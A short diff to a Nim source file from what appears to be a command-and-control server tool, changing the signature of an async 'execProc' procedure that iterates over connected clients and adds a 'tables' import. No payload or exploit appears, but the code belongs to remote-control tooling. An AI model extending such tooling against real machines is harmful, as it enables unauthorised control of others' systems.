@@ -1,9 +1,9 @@
-import terminal, asyncdispatch
+import terminal, asyncdispatch, tables
 
 import ../../types
 import ../../logging
 
-proc execProc*(args: seq[string], server: C2Server) {.async.} =
+proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   for client in server.clients:
     if client.connected:
       stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
